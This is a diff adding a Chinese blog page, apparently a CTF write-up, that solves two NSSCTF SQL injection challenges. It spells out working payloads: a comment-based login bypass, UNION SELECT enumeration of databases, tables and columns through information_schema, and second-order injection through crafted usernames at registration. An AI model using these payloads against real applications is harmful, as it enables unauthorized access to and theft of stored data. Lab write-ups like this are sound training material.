@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="SQL注入[MoeCTF 2022]Sqlmap_boy题目平台 nssctf 题目链接：[MoeCTF 2022]Sqlmap_boy | NSSCTF 点进去看到了一个登录页面  我们这里看到了一个登录页面试了一下admin&#x2F;admin（这个是因为一般用户名为admin&#x2F;admin或root&#x2F;root）登录进去看到了  我们没有登录的时候点击F12（这个是因为我们">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/">
+<meta property="og:site_name" content="jxdgx">
+<meta property="og:description" content="SQL注入[MoeCTF 2022]Sqlmap_boy题目平台 nssctf 题目链接：[MoeCTF 2022]Sqlmap_boy | NSSCTF 点进去看到了一个登录页面  我们这里看到了一个登录页面试了一下admin&#x2F;admin（这个是因为一般用户名为admin&#x2F;admin或root&#x2F;root）登录进去看到了  我们没有登录的时候点击F12（这个是因为我们">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230906193408824.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230906193649268.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230906195003287.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230906201929700.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230906202616617.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230906202656713.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230906203243699.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907121908303.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20230907124211004.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20230907154355268.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907162852857.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907171147188.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907171401854.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907171453671.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907171613256.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907172630446.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907172852369.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907173051786.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907174417290.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907174934781.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907175227386.png">
+<meta property="article:published_time" content="2022-04-10T13:07:12.000Z">
+<meta property="article:modified_time" content="2026-05-25T13:07:40.155Z">
+<meta property="article:author" content="jxdgx">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230906193408824.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+        
+      
+    
+    <!-- title -->
+    <title>SQL注入 | jxdgx</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+<!-- mathjax -->
+
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$','$']],
+        displayMath: [['$$','$$'], ['\[','\]']]
+      }
+    });
+  </script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr is-post-page">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&text=SQL注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&is_video=false&description=SQL注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SQL注入&body=Check out this article: https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&name=SQL注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&t=SQL注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MoeCTF-2022-Sqlmap-boy"><span class="toc-number">1.1.</span> <span class="toc-text">[MoeCTF 2022]Sqlmap_boy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%A1%AE%E5%AE%9A%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.确定闭合方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%A1%AE%E5%AE%9A%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.确定字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%A1%AE%E5%AE%9A%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.确定回显位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">1.1.4.</span> <span class="toc-text">4.爆数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-number">1.1.5.</span> <span class="toc-text">5.爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%88%86%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.6.</span> <span class="toc-text">6.爆字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5flAg%E7%9A%84%E5%80%BC"><span class="toc-number">1.1.7.</span> <span class="toc-text">7.获取字段flAg的值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#October-2019-Twice-SQL-Injection"><span class="toc-number">1.3.</span> <span class="toc-text">[October 2019]Twice SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%89%BE%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.找闭合方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.爆数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5flag%E7%9A%84%E5%80%BC"><span class="toc-number">1.3.4.</span> <span class="toc-text">4.获取字段flag的值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        
+<div class="post-layout">
+  <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      
+    <h1 class="posttitle p-name" itemprop="name headline">
+        SQL注入
+    </h1>
+
+
+
+      <div class="meta meta-post">
+        
+    <div class="postdate">
+      
+        <time datetime="2022-04-10T13:07:12.000Z" class="dt-published" itemprop="datePublished">2022-04-10</time>
+        
+      
+    </div>
+
+
+        
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+    </div>
+
+
+        
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a>
+    </div>
+
+
+      </div>
+    </header>
+    
+
+    <div class="content e-content" itemprop="articleBody">
+      <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="MoeCTF-2022-Sqlmap-boy"><a href="#MoeCTF-2022-Sqlmap-boy" class="headerlink" title="[MoeCTF 2022]Sqlmap_boy"></a>[MoeCTF 2022]Sqlmap_boy</h2><p>题目平台 nssctf</p>
+<p>题目链接：[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3350">MoeCTF 2022]Sqlmap_boy | NSSCTF</a></p>
+<p>点进去看到了一个登录页面</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230906193408824.png" alt="image-20230906193408824"></p>
+<p>我们这里看到了一个登录页面试了一下admin&#x2F;admin（这个是因为一般用户名为admin&#x2F;admin或root&#x2F;root）登录进去看到了</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230906193649268.png" alt="image-20230906193649268"></p>
+<p>我们没有登录的时候点击F12（这个是因为我们可以看一下前端代码，一般这个会有一点提示）可以看到</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230906195003287.png" alt="image-20230906195003287"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><!-- $sql = 'select username,password from users where username="'.$username.'" && password="'.$password.'";'; --></span><br></pre></td></tr></table></figure>
+
+<p>在这里我们输入admin” – +密码随便输入就可以进去，这是因为在输入admin”– +后于前面username&#x3D;”进行了闭合– +注释了后面的内容</p>
+<p>我们这样也进入了登录页面</p>
+<h3 id="1-确定闭合方式"><a href="#1-确定闭合方式" class="headerlink" title="1.确定闭合方式"></a>1.确定闭合方式</h3><p>我们后面加入一个’后，页面就不显示了</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230906201929700.png" alt="image-20230906201929700"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1&quot; 回显正常</span><br><span class="line">id=1&#x27; 回显报错</span><br><span class="line">id=1&#x27; -- +回显正常</span><br></pre></td></tr></table></figure>
+
+<p>这个时候我们可以说明这个闭合方式为’</p>
+<h3 id="2-确定字段"><a href="#2-确定字段" class="headerlink" title="2.确定字段"></a>2.确定字段</h3><p>我们开始确定字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 -- + 显示正常</span><br></pre></td></tr></table></figure>
+
+<p>当字段为3的时候</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230906202616617.png" alt="image-20230906202616617"></p>
+<p>字段为4的时候 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 -- + 显示不正常</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230906202656713.png" alt="image-20230906202656713"></p>
+<p>这个时候我们确定字段为3</p>
+<h3 id="3-确定回显位置"><a href="#3-确定回显位置" class="headerlink" title="3.确定回显位置"></a>3.确定回显位置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 -- +</span><br></pre></td></tr></table></figure>
+
+<p>我们这里用-1是因为数据从1开始的，我们使用联合查询来判断显示的位置</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230906203243699.png" alt="image-20230906203243699"></p>
+<p>在这里我们可以看到2和3都是有回显的</p>
+<h3 id="4-爆数据库名"><a href="#4-爆数据库名" class="headerlink" title="4.爆数据库名"></a>4.爆数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),database() -- +</span><br></pre></td></tr></table></figure>
+
+<p>我们得到数据库名moectf，然后我们在去得到表名</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907121908303.png" alt="image-20230907121908303"></p>
+<h3 id="5-爆表名"><a href="#5-爆表名" class="headerlink" title="5.爆表名"></a>5.爆表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;moectf&#x27; -- +</span><br></pre></td></tr></table></figure>
+
+<p>group_concat(table_name)的意思是统计出表的名字，</p>
+<p>information_schema.tables是查询information_schema中的表信息，数据库名为查询的moectf</p>
+<p>得到了三个表articles,flag,users</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20230907124211004.png" alt="image-20230907124211004"></p>
+<p>我们看到了flag我们开始查询flag这个字段的值</p>
+<h3 id="6-爆字段"><a href="#6-爆字段" class="headerlink" title="6.爆字段"></a>6.爆字段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;moectf&#x27; and table_name=&#x27;flag&#x27; -- +</span><br></pre></td></tr></table></figure>
+
+<p>这个命令group_concat(column_name)是统计出列的信息，information_schema.columns查询库中的字段，table_schema&#x3D;’moectf’ and table_name&#x3D;’flag’ 来自于moectf数据库。表名为flag</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20230907154355268.png" alt="image-20230907154355268"></p>
+<p>我们得到了字段flAg</p>
+<h3 id="7-获取字段flAg的值"><a href="#7-获取字段flAg的值" class="headerlink" title="7.获取字段flAg的值"></a>7.获取字段flAg的值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(flAg),3 from flag -- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907162852857.png" alt="image-20230907162852857"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个就是简单的联合注入就是找到基础的闭合点，判断出字段数，查看那个回显然后开始爆数据库名，表名，字段的值。</p>
+<p>这个主要来培养一下思路</p>
+<h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="[October 2019]Twice SQL Injection"></a>[October 2019]Twice SQL Injection</h2><p>题目平台 : nssctf</p>
+<p>题目链接：<strong>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/191">October 2019]Twice SQL Injection | NSSCTF</a></strong></p>
+<p>我们点进去是一个登录页面也有注册按钮</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907171147188.png" alt="image-20230907171147188"></p>
+<p>我们随意去注册一个账号1&#x2F;1</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907171401854.png" alt="image-20230907171401854"></p>
+<p>然后我们登录进去，发现一个框我们进行一下测试</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907171453671.png" alt="image-20230907171453671"></p>
+<p>我们试了一些发现被转义了</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907171613256.png" alt="image-20230907171613256"></p>
+<h3 id="1-找闭合方式"><a href="#1-找闭合方式" class="headerlink" title="1.找闭合方式"></a>1.找闭合方式</h3><p>题目名称说的是二次注入，我们注册一个形如1” union select database() #这样的账号看是否可以注册，如果可以注册，这个就保存到了数据库。这样我们就可以在登录的时候我们找到闭合方式从而来实现sql注入实现</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907172630446.png" alt="image-20230907172630446"></p>
+<p>这个时候我们登录使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; union select database() # </span><br></pre></td></tr></table></figure>
+
+<p>我们使用双引号没有回显我们在试一下单引号</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907172852369.png" alt="image-20230907172852369"></p>
+<h3 id="2-爆数据库名"><a href="#2-爆数据库名" class="headerlink" title="2.爆数据库名"></a>2.爆数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select database() # </span><br></pre></td></tr></table></figure>
+
+<p>在使用单引号的时候得到了回显说明单引号为闭合方式且数据库名为ctftraining，</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907173051786.png" alt="image-20230907173051786"></p>
+<h3 id="3-爆表名"><a href="#3-爆表名" class="headerlink" title="3.爆表名"></a>3.爆表名</h3><p>这个时候我们继续注册这个用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27; #</span><br></pre></td></tr></table></figure>
+
+<p>然后登录密码就是随意写</p>
+<p>这个用户的意思是获取名为’ctftraining’数据库中所有表的名称，其中’ctftraining’是数据库的名称。如果查询成功，它将返回一个包含所有表名称的结果</p>
+<p>这个时候我们得到了flag,news,users三个表名</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907174417290.png" alt="image-20230907174417290"></p>
+<p>3.爆字段</p>
+<p>我们还和上一个一样去注册用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; #</span><br></pre></td></tr></table></figure>
+
+<p>从数据库系统的 <code>information_schema</code> 数据库中的 <code>columns</code> 表中，查找名为 <code>flag</code> 的表的所有列名</p>
+<p>我们得到了字段名flag</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907174934781.png" alt="image-20230907174934781"></p>
+<h3 id="4-获取字段flag的值"><a href="#4-获取字段flag的值" class="headerlink" title="4.获取字段flag的值"></a>4.获取字段flag的值</h3><p>我们在注册一个这样的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select flag from flag #</span><br></pre></td></tr></table></figure>
+
+<p>这个意思是查询flag表中flag字段的值</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230907175227386.png" alt="image-20230907175227386"></p>
+<p>到此这个就完成了</p>
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>这个主要就是考查一个二次注入就是在注册的时候没有去过滤严格从而导致了可以注册像带” ‘的字符，这样我们在登录的时候就可以去找到闭合从而实现非法的sql语句的注入</p>
+
+    </div>
+  </article>
+  
+    <aside class="post-sidebar-toc">
+      <div class="post-sidebar-toc-inner">
+        <div class="post-sidebar-toc-title">Contents</div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MoeCTF-2022-Sqlmap-boy"><span class="toc-number">1.1.</span> <span class="toc-text">[MoeCTF 2022]Sqlmap_boy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%A1%AE%E5%AE%9A%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.确定闭合方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%A1%AE%E5%AE%9A%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.确定字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%A1%AE%E5%AE%9A%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.确定回显位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">1.1.4.</span> <span class="toc-text">4.爆数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-number">1.1.5.</span> <span class="toc-text">5.爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%88%86%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.6.</span> <span class="toc-text">6.爆字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5flAg%E7%9A%84%E5%80%BC"><span class="toc-number">1.1.7.</span> <span class="toc-text">7.获取字段flAg的值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#October-2019-Twice-SQL-Injection"><span class="toc-number">1.3.</span> <span class="toc-text">[October 2019]Twice SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%89%BE%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.找闭合方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.爆数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5flag%E7%9A%84%E5%80%BC"><span class="toc-number">1.3.4.</span> <span class="toc-text">4.获取字段flag的值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+      </div>
+    </aside>
+  
+</div>
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+    
+      <div id="toc-footer" style="display: none">
